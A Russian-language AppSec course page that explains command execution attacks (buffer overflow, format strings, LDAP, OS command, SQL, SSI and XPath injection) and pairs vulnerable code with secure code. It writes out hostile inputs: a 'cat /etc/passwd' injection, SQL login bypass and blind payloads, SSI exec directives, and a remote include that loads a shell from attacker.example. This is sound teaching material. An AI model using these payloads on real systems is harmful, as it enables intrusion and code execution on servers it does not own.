---
title: "Command Execution — OWASP | Курс AppSec"
description: "OWASP Top 10 инъекции: SQL injection, OS command injection, SSTI и XXE — векторы RCE-атак и практические методы защиты AppSec."
keywords: "OWASP, SQL injection, OS injection, SSTI, XXE, AppSec, RCE, инъекции, уязвимости, command execution, Remote Code Execution"
---

<div class="hero-section hero-section--compact">
  <div class="hero-content">
    <h1 class="hero-title">OWASP — Command Execution</h1>
    <p class="hero-sub">Уязвимости выполнения команд · OWASP Top 10</p>
  </div>
</div>

## О документе

Уязвимости выполнения команд — класс инъекционных атак, при которых неочищенные пользовательские данные передаются интерпретатору (SQL, OS shell, шаблонизатор). SQL Injection позволяет читать и модифицировать базу данных или выполнять произвольные команды ОС через функции вроде `xp_cmdshell`. OS Command Injection — прямое выполнение системных команд через `system()`, `exec()` и аналоги.

SSTI (Server-Side Template Injection) возникает при подстановке пользовательских данных непосредственно в шаблонный движок (Jinja2, Twig, Freemarker) и зачастую приводит к Remote Code Execution (RCE). XXE (XML External Entity) — эксплуатация XML-парсеров для чтения произвольных файлов системы или SSRF.

Данный класс уязвимостей обнаруживается инструментами SAST в [лабораторной работе №7](../../labs/basic/lab07.md) и DAST в [лабораторной работе №8](../../labs/basic/lab08.md). Смотри также: [классификация SAST/DAST инструментов](../appsec_tt.md).

***

## Содержание документа

Эта секция описывает атаки, направленные на выполнение кода на Web-сервере. Все серверы используют данные, переданные пользователем при обработке запросов. Часто эти данные используются при составлении команд, применяемых для генерации динамического содержимого. Если при разработке не учитываются требования безопасности, злоумышленник получает возможность модифицировать исполняемые команды.

### Переполнение буфера (Buffer Overflow)

Эксплуатация переполнения буфера позволяет злоумышленнику изменить путь исполнения программы путем перезаписи данных в памяти системы. Переполнение буфера является наиболее распространенной причиной ошибок в программах. Оно возникает, когда объем данных превышает размер выделенного под них буфера. Когда буфер переполняется, данные переписывают другие области памяти, что приводит к возникновению ошибки. Если злоумышленник имеет возможность управлять процессом переполнения, это может вызвать ряд серьезных проблем.

Переполнение буфера может вызывать отказы в обслуживании, приводя к повреждению памяти и вызывая ошибки в программах. Более серьезные ситуации позволяют изменить путь исполнения программы и выполнить в её контексте различные действия.

Используя переполнение буфера, можно перезаписывать служебные области памяти, например, адрес возврата из функций в стеке. Также, при переполнении могут быть переписаны значения переменных в программе.

Переполнение буфера является наиболее распространенной проблемой в безопасности и нередко затрагивает Web-серверы. Однако атаки, эксплуатирующие эту уязвимость, используются против Web-приложений не очень часто. Причина этого кроется в том, что атакующему, как правило, необходимо проанализировать исходный код или образ программы. Поскольку атакующему приходится эксплуатировать нестандартную программу на удаленном сервере, ему приходится атаковать "вслепую", что снижает шансы на успех.

Переполнение буфера обычно возникает при создании программ на языках C и C++. Если часть сайта создана с использованием этих языков, сайт может быть уязвим для переполнения буфера.

**Ссылки:**

- [Inside the Buffer Overflow Attack: Mechanism, Method and Prevention](http://www.sans.org/rr/code/inside_buffer.php) -- By Mark E. Donaldson, GSEC
- [w00w00 on Heap Overflows](http://www.w00w00.org/files/articles/heaptut.txt) -- By Matt Conover, w00w00 Security Team
- [Smashing The Stack For Fun And Profit](http://www.insecure.org/stf/smashstack.txt) -- By Aleph One, Phrack 49

### Атака на функции форматирования строк (Format String Attack)

При использовании этих атак путь исполнения программы модифицируется методом перезаписи областей памяти с помощью функций форматирования символьных переменных. Уязвимость возникает, когда пользовательские данные применяются в качестве аргументов функций форматирования строк, таких как `fprintf`, `printf`, `sprintf`, `setproctitle`, `syslog` и т.д.

Если атакующий передает приложению строку, содержащую символы форматирования (`%f`, `%p`, `%n` и т.д.), то у него появляется возможность:

- выполнить произвольный код на сервере
- считывать значения из стека
- вызывать ошибки в программе/отказ в обслуживании

**Пример:**

Предположим, Web-приложение хранит параметр `emailAddress` для каждого пользователя. Это значение используется в качестве аргумента функции `printf`:

```c
printf(emailAddress);
```

Если значение переменной `emailAddress` содержит символы форматирования, функция `printf` будет обрабатывать их согласно заложенной в неё логике. Поскольку дополнительных значений этой функции не передано, будут использованы значения стека, хранящие другие данные.

Возможны следующие методы эксплуатации:

- **Чтение данных из стека:** если вывод функции `printf` передается атакующему, он получает возможность чтения данных из стека, используя символ форматирования `%x`
- **Чтение строк из памяти процесса:** атакующий может получать строки из памяти процесса, передавая в параметрах символ `%s`
- **Запись целочисленных значений в память процесса:** используя символ форматирования `%n`, злоумышленник может сохранять целочисленные значения в памяти процесса, перезаписывая важные значения, например флаги управления доступом или адрес возврата

**Ссылки:**

- [(Maybe) the first publicly known Format Strings exploit](http://archives.neohapsis.com/archives/bugtraq/1999-q3/1009.html)
- [Analysis of format string bugs](http://downloads.securityfocus.com/library/format-bug-analysis.pdf) -- By Andreas Thuemmel
- [Format string input validation error in wu-ftpd site_exec() function](http://www.kb.cert.org/vuls/id/29823)
- [Ошибки переполнения буфера извне и изнутри как обобщенный опыт](http://www.samag.ru/art/03.2004/03.2004_07.pdf) -- Крис Касперски (рус.)
- [Эксплуатирование SEH в среде Win32](http://www.securitylab.ru/contest/212085.php) -- houseofdabus (рус.)

### Внедрение операторов LDAP (LDAP Injection)

Атаки этого типа направлены на Web-серверы, создающие запросы к службе LDAP на основе данных, вводимых пользователем.

Упрощенный протокол доступа к службе каталога (Lightweight Directory Access Protocol, LDAP) -- открытый протокол для создания запросов и управления службами каталога, совместимыми со стандартом X.500. Протокол LDAP работает поверх транспортных протоколов Internet (TCP/UDP). Web-приложение может использовать данные, предоставленные пользователем для создания запросов по протоколу LDAP при генерации динамических Web-страниц.

Если информация, полученная от клиента, должным образом не верифицируется, атакующий получает возможность модифицировать LDAP-запрос. Запрос будет выполняться с тем же уровнем привилегий, с каким работает компонент приложения, выполняющий запрос (сервер СУБД, Web-сервер и т.д). Если данный компонент имеет права на чтение или модификацию данных в структуре каталога, злоумышленник получает те же возможности.

**Пример:**

Уязвимый код (VBScript):

```vbscript
<%@ Language=VBScript %>
<%
Dim userName
Dim filter
Dim ldapObj

Const LDAP_SERVER = "ldap.example"

userName = Request.QueryString("user")

if( userName = "" ) then
  Response.Write("<b>Invalid request. Please specify a valid user name</b><br>")
  Response.End()
end if

filter = "(uid=" + CStr(userName) + ")"  ' searching for the user entry

' Creating the LDAP object and setting the base dn
Set ldapObj = Server.CreateObject("IPWorksASP.LDAP")
ldapObj.ServerName = LDAP_SERVER
ldapObj.DN = "ou=people,dc=spilab,dc=com"

' Setting the search filter
ldapObj.SearchFilter = filter

ldapObj.Search

' Showing the user information
While ldapObj.NextResult = 1
  Response.Write("<p>")
  Response.Write("<b><u>User information for: " + ldapObj.AttrValue(0) + "</u></b><br>")
  For i = 0 To ldapObj.AttrCount -1
    Response.Write("<b>" + ldapObj.AttrType(i) +"</b>: " + ldapObj.AttrValue(i) + "<br>")
  Next
  Response.Write("</p>")
Wend
%>
```

Имя пользователя, полученное от клиента, проверяется только на наличие пустого значения. Если в переменной содержится какое-то значение, оно используется для инициализации переменной `filter` и построения запроса к службе LDAP.

**Пример атаки:**

```
http://example/ldapsearch.asp?user=*
```

В этом случае серверу передается символ `*`, что приводит к формированию запроса с фильтром `uid=*`. Выполнение запроса приводит к отображению всех объектов, имеющих атрибут `uid`.

**Ссылки:**

- [LDAP Injection: Are Your Web Applications Vulnerable?](http://www.spidynamics.com/whitepapers/LDAPinjection.pdf) -- By Sacha Faust, SPI Dynamics
- [A String Representation of LDAP Search Filters](http://www.ietf.org/rfc/rfc1960.txt)
- [Understanding LDAP](http://www.redbooks.ibm.com/redbooks/SG244986.html)

### Выполнение команд ОС (OS Commanding)

Атаки этого класса направлены на выполнение команд операционной системы на Web-сервере путем манипуляции входными данными. Если информация, полученная от клиента, должным образом не верифицируется, атакующий получает возможность выполнить команды ОС. Они будут выполняться с тем же уровнем привилегий, с каким работает компонент приложения, выполняющий запрос (сервер СУБД, Web-сервер и т.д).

**Пример:**

Язык Perl позволяет перенаправлять вывод процесса оператору `open` используя символ `|` в конце имени файла:

```perl
# Выполнить "/bin/ls" и передать
# результат оператору open
open(FILE, "/bin/ls|")
```

Web-приложения часто используют параметры, которые указывают на то, какой файл отображать или использовать в качестве шаблона. Если этот параметр не проверяется достаточно тщательно, атакующий может подставить команды ОС после символа `|`.

Предположим, приложение оперирует URL следующего вида:

```
http://example/cgi-bin/showInfo.pl?name=John&template=tmp1.txt
```

Изменяя значение параметра `template`, злоумышленник дописывает необходимую команду (`/bin/ls`) к используемой приложением:

```
http://example/cgi-bin/showInfo.pl?name=John&template=/bin/ls|
```

Большинство языков сценариев позволяет запускать команды ОС во время выполнения, используя варианты функции `exec`. Следующий пример иллюстрирует уязвимый PHP-сценарий:

```php
exec("ls -la $dir",$lines,$rc);
```

Используя символ `;` (Unix) или `&` (Windows) в параметре `dir` можно выполнить команду операционной системы:

```
http://example/directory.php?dir=%3Bcat%20/etc/passwd
```

В результате подобного запроса злоумышленник получает содержимое файла `/etc/passwd`.

**Ссылки:**

- [Perl CGI Problems](http://www.wiretrip.net/rfp/txt/phrack55.txt) -- By RFP, Phrack Magazine, Issue 55
- [Marcus Xenakis directory.php Shell Command Execution Vulnerability](http://www.securityfocus.com/bid/4278)
- [NCSA Secure Programming Guidelines](http://archive.ncsa.uiuc.edu/General/Grid/ACES/security/programming/#cgi)

=== "Уязвимый код"

    ```javascript
    const { exec } = require("child_process");

    app.get("/api/ping", (req, res) => {
      const host = req.query.host;
      // Пользовательский ввод напрямую в shell
      exec(`ping -c 4 ${host}`, (err, stdout) => {
        res.send(stdout);
      });
      // host = "8.8.8.8; cat /etc/passwd" → RCE
    });
    ```

=== "Защищённый код"

    ```javascript
    const { execFile } = require("child_process");

    app.get("/api/ping", (req, res) => {
      const host = req.query.host;

      // Валидация: только IP или hostname
      if (!/^[a-zA-Z0-9.-]+$/.test(host)) {
        return res.status(400).json({ error: "Invalid host" });
      }

      // execFile — НЕ запускает shell, аргументы как массив
      execFile("ping", ["-c", "4", host], (err, stdout) => {
        res.send(stdout);
      });
    });
    ```

!!! warning "Правило"

    Никогда не используйте `exec()` / `system()` с пользовательским вводом. Используйте `execFile()` (Node.js) или `subprocess.run([...], shell=False)` (Python) — аргументы передаются как массив, shell не запускается.

### Внедрение операторов SQL (SQL Injection)

Эти атаки направлены на Web-серверы, создающие SQL-запросы к серверам СУБД на основе данных, вводимых пользователем.

Язык запросов Structured Query Language (SQL) представляет собой специализированный язык программирования, позволяющий создавать запросы к серверам СУБД. Большинство серверов поддерживают этот язык в вариантах, стандартизированных ISO и ANSI. В большинстве современных СУБД присутствуют расширения диалекта SQL, специфичные для данной реализации (T-SQL в Microsoft SQL Server, PL/SQL в Oracle и т.д.).

Многие Web-приложения используют данные, переданные пользователем, для создания динамических Web-страниц. Если информация, полученная от клиента, должным образом не верифицируется, атакующий получает возможность модифицировать запрос к SQL-серверу. Запрос будет выполняться с тем же уровнем привилегий, с каким работает компонент приложения. В результате злоумышленник может получить полный контроль над сервером СУБД и даже его операционной системой.

**Пример:**

Предположим, аутентификация в Web-приложение осуществляется с помощью Web-формы, обрабатываемой следующим кодом:

```sql
SQLQuery = "SELECT Username FROM Users WHERE
Username = '" & strUsername & "' AND Password = '"
& strPassword & "'"
strAuthCheck = GetQueryResult(SQLQuery)
```

Разработчики непосредственно используют переданные пользователями значения `strUsername` и `strPassword` для создания SQL-запроса. Предположим, злоумышленник передаст следующие значения параметров:

```
Login: ' OR ''='
Password: ' OR ''='
```

В результате серверу будет передан следующий SQL-запрос:

```sql
SELECT Username FROM Users WHERE Username = '' OR
''='' AND Password = '' OR ''=''
```

Вместо сравнения имени пользователя и пароля с записями в таблице Users, данный запрос сравнивает пустую строку с пустой строкой. Результат подобного запроса всегда будет равен True, и злоумышленник войдет в систему от имени первого пользователя в таблице.

#### Blind SQL Injection

Обычно выделяют два метода эксплуатации: обычная атака и атака вслепую (Blind SQL Injection). В первом случае злоумышленник подбирает параметры запроса, используя информацию об ошибках, генерируемую Web-приложением.

Добавляя оператор `union` к запросу, злоумышленник проверяет доступность базы данных:

```
http://example/article.asp?ID=2+union+all+select+name+from+sysobjects
```

При атаке вслепую стандартные сообщения об ошибках модифицированы, и сервер возвращает понятную для пользователя информацию. Наиболее распространенный метод проверки -- добавление выражений, возвращающих истинное и ложное значение:

```
http://example/article.asp?ID=2+and+1=1   (должна вернуться нормальная страница)
http://example/article.asp?ID=2+and+1=0   (вернется ошибка или пустая страница)
```

**Ссылки:**

- [SQL Injection: Are your Web Applications Vulnerable](http://www.spidynamics.com/support/whitepapers/WhitepaperSQLInjection.pdf) -- SPI Dynamics
- [Blind SQL Injection: Are your Web Applications Vulnerable](http://www.spidynamics.com/support/whitepapers/Blind_SQLInjection.pdf) -- SPI Dynamics
- [Advanced SQL Injection in SQL Server Applications](http://www.nextgenss.com/papers/advanced_sql_injection.pdf) -- Chris Anley, NGSSoftware
- [More advanced SQL Injection](http://www.nextgenss.com/papers/more_advanced_sql_injection.pdf) -- Chris Anley, NGSSoftware
- [SQL Injection Walkthrough](http://www.securiteam.com/securityreviews/5DP0N1P76E.html)
- [Blind SQL Injection -- Imperva](http://www.imperva.com/application_defense_center/white_papers/blind_sql_server_injection.html)
- [Introduction to SQL Injection Attacks for Oracle Developers -- Integrigy](http://www.net-security.org/dl/articles/IntegrigyIntrotoSQLInjectionAttacks.pdf)
- [Управление Microsoft SQL Server используя SQL инъекции](http://www.securitylab.ru/analytics/216396.php) -- Cesar Cerrudo (рус.)
- [Внедрение SQL кода с завязанными глазами](http://www.securitylab.ru/analytics/216332.php) -- Офер Маор, Амичай Шалман (рус.)
- [SQL инъекция и ORACLE](http://www.securitylab.ru/analytics/216253.php) (рус.)

=== "Уязвимый код"

    ```javascript
    app.post("/api/login", (req, res) => {
      const { username, password } = req.body;

      // Конкатенация пользовательского ввода в SQL
      const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
      db.query(query, (err, rows) => {
        if (rows.length > 0) res.json({ token: generateToken(rows[0]) });
        else res.status(401).json({ error: "Invalid credentials" });
      });
      // username = "' OR '1'='1' --" → обход аутентификации
    });
    ```

=== "Защищённый код"

    ```javascript
    app.post("/api/login", (req, res) => {
      const { username, password } = req.body;

      // Параметризованный запрос — плейсхолдеры вместо конкатенации
      const query = "SELECT * FROM users WHERE username = ? AND password = ?";
      db.query(query, [username, password], (err, rows) => {
        if (rows.length > 0) res.json({ token: generateToken(rows[0]) });
        else res.status(401).json({ error: "Invalid credentials" });
      });
    });
    ```

!!! warning "Правило"

    Всегда используйте параметризованные запросы (prepared statements). Никогда не конкатенируйте пользовательский ввод в SQL-строку. ORM (Sequelize, Prisma, SQLAlchemy) делают это по умолчанию.

### Внедрение серверных расширений (SSI Injection)

Атаки данного класса позволяют злоумышленнику передать исполняемый код, который в дальнейшем будет выполнен на Web-сервере. Уязвимости, приводящие к возможности осуществления данных атак, обычно заключаются в отсутствии проверки данных, предоставленных пользователем, перед сохранением их в интерпретируемом сервером файле.

Перед генерацией HTML-страницы сервер может выполнять сценарии, например Server-Side Includes (SSI). В некоторых ситуациях исходный код страниц генерируется на основе данных, предоставленных пользователем.

Если атакующий передает серверу операторы SSI, он может получить возможность выполнения команд операционной системы или включить в страницу запрещенное содержимое при следующем отображении.

**Пример:**

Следующее выражение будет интерпретировано в качестве команды, просматривающей содержимое каталога сервера в Unix-системах:

```html
<!--#exec cmd="/bin/ls /" -->
```

Следующее выражение позволяет получить строки соединения с базой данных и другую чувствительную информацию из файла конфигурации приложения .NET:

```html
<!--#INCLUDE VIRTUAL="/web.config"-->
```

Другие возможности для атаки возникают, когда Web-сервер использует в URL имя подключаемого файла сценариев, но должным образом его не верифицирует. В этом случае злоумышленник может создать на сервере файл и подключить его к выполняемому сценарию, или указать в качестве имени сценария URL своего сервера.

**Пример:**

Предположим, Web-приложение работает со ссылками вида:

```
http://portal.example/index.php?template=news
```

```php
$body = $_GET['page'] . ".php";
```

Злоумышленник может указать в качестве URL:

```
http://portal.example/index.php?template=http://attacker.example/phpshell
```

и сценарий `phpshell` будет загружен с сервера злоумышленника и выполнен на сервере с правами Web-сервера.

**Ссылки:**

- [Server Side Includes (SSI)](http://hoohoo.ncsa.uiuc.edu/docs/tutorials/includes.html) -- NCSA HTTPd
- [Security Tips for Server Configuration](http://httpd.apache.org/docs/misc/security_tips.html#ssi) -- Apache HTTPD
- [Header Based Exploitation: Web Statistical Software Threats](http://www.cgisecurity.net/papers/header-based-exploitation.txt) -- CGISecurity.com
- [Santi worm](http://www.f-secure.com/v-descs/santy_a.shtml)

### Внедрение операторов XPath (XPath Injection)

Эти атаки направлены на Web-серверы, создающие запросы на языке XPath на основе данных, вводимых пользователем.

Язык XPath 1.0 разработан для предоставления возможности обращения к частям документа на языке XML. Он может быть использован непосредственно либо в качестве составной части XSLT-преобразования XML-документов или выполнения запросов XQuery.

Синтаксис XPath близок к языку SQL-запросов. Предположим, что существует документ XML, содержащий элементы, соответствующие именам пользователей, каждый из которых содержит три элемента -- имя, пароль и номер счета. Следующее выражение на языке XPath позволяет определить номер счета пользователя "jsmith" с паролем "Demo1234":

```xpath
string(//user[name/text()='jsmith' and password/text()='Demo1234']/account/text())
```

Если запросы XPath генерируются во время исполнения на основе пользовательского ввода, у атакующего появляется возможность модифицировать запрос с целью обхода логики работы программы.

**Пример (Microsoft ASP.NET и C#):**

```csharp
XmlDocument XmlDoc = new XmlDocument();
XmlDoc.Load("...");
XPathNavigator nav = XmlDoc.CreateNavigator();
XPathExpression expr =
nav.Compile("string(//user[name/text()='"+TextBox1.Text+"'
and password/text()='"+TextBox2.Text+
"']/account/text())");
String account=Convert.ToString(nav.Evaluate(expr));
if (account=="") {
  // name+password pair is not found in the XML document
  // login failed.
} else {
  // account found -> Login succeeded.
  // Proceed into the application.
}
```

В случае использования подобного кода злоумышленник может внедрить в запрос выражения на языке XPath, например, ввести в качестве имени пользователя:

```
' or 1=1 or ''='
```

В этом случае запрос всегда будет возвращать счет первого пользователя в документе:

```xpath
string(//user[name/text()='' or 1=1 or ''='' and password/text()='foobar']/account/text())
```

В результате злоумышленник получит доступ в систему от имени первого в документе XML пользователя без предоставления имени пользователя и пароля.

**Ссылки:**

- [XML Path Language (XPath) Version 1.0](http://www.w3.org/TR/xpath) -- W3C Recommendation
- [Encoding a Taxonomy of Web Attacks with Different-Length Vectors](http://arxiv.org/PS_cache/cs/pdf/0210/0210026.pdf) -- G. Alvarez and S. Petrovic
- [Blind XPath Injection](http://www.sanctuminc.com/pdfc/WhitePaper_Blind_XPath_Injection_20040518.pdf) -- Amit Klein
